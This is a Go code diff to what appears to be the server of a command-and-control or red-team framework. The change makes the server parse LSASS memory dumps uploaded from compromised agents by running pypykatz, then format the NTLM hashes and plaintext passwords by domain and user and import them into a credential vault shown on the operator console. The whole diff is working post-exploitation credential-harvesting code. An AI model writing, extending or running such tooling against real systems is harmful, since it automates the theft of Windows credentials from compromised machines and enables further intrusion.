@@ -6,6 +6,8 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
+	"os/exec"
+	"path/filepath"
 	"strings"
 )
 
@@ -454,17 +456,53 @@ func (s *Server) CheckAndPromptBH(agentID, filename string, data []byte) {
 	))
 }
 
-// CheckAndPromptLSASS detects an uploaded LSASS minidump and broadcasts a
-// LSASS_DUMP_PROMPT event so the GUI can offer offline-analysis instructions.
-func (s *Server) CheckAndPromptLSASS(agentID, filename string) {
+// CheckAndPromptLSASS detects an uploaded LSASS minidump, auto-parses it with
+// pypykatz (if available), imports credentials to the vault, and updates the
+// task result so hashes appear in the operator console. Falls back to a manual
+// download prompt when pypykatz is not installed.
+func (s *Server) CheckAndPromptLSASS(agentID, filename string, taskID int64) {
 	lo := strings.ToLower(filename)
 	if !strings.HasSuffix(lo, ".dmp") && !strings.Contains(lo, "lsass") {
 		return
 	}
-	s.printf("[LSASS] dump detectado: %s — analizar con pypykatz\n", filename)
-	BroadcastGUI("LSASS_DUMP_PROMPT", agentID, fmt.Sprintf(
-		`{"filename":%q,"agent_id":%q}`, filename, agentID,
-	))
+	dumpPath := filepath.Join(s.cfg.DataDir, "uploads", agentID, filepath.Base(filename))
+	go s.parseLSASSDump(agentID, taskID, dumpPath, filename)
+}
+
+func (s *Server) parseLSASSDump(agentID string, taskID int64, dumpPath, filename string) {
+	out, err := exec.Command("pypykatz", "lsa", "minidump", dumpPath).CombinedOutput()
+	if err != nil {
+		s.printf("[LSASS] pypykatz no disponible — descarga manual: %s\n", filename)
+		BroadcastGUI("LSASS_DUMP_PROMPT", agentID, fmt.Sprintf(
+			`{"filename":%q,"agent_id":%q}`, filename, agentID,
+		))
+		return
+	}
+
+	pyOut := string(out)
+	creds := ParseCreds(pyOut)
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("[+] LSASS parsed — %d credential(s)\n\n", len(creds)))
+	for _, c := range creds {
+		switch c.credType {
+		case "ntlm":
+			sb.WriteString(fmt.Sprintf("  [NTLM]      %s\\%s : %s\n", c.domain, c.username, c.secret))
+		case "plaintext":
+			sb.WriteString(fmt.Sprintf("  [PLAINTEXT] %s\\%s : %s\n", c.domain, c.username, c.secret))
+		default:
+			sb.WriteString(fmt.Sprintf("  [%-10s] %s\\%s : %s\n", strings.ToUpper(c.credType), c.domain, c.username, c.secret))
+		}
+	}
+	parsed := sb.String()
+	s.printf("[LSASS] %d credenciales de %s\n", len(creds), filename)
+
+	// InsertResult handles INSERT vs UPDATE automatically and triggers
+	// autoParseCredentials which imports the hashes to the credential vault.
+	if taskID > 0 {
+		_ = s.db.InsertResult(taskID, agentID, parsed, "")
+		BroadcastGUI("CREDS_UPDATED", agentID, fmt.Sprintf("%d creds from %s", len(creds), filename))
+	}
 }
 
 // CheckAndPromptNTDS detects an uploaded ntds.dit or SYSTEM hive and broadcasts
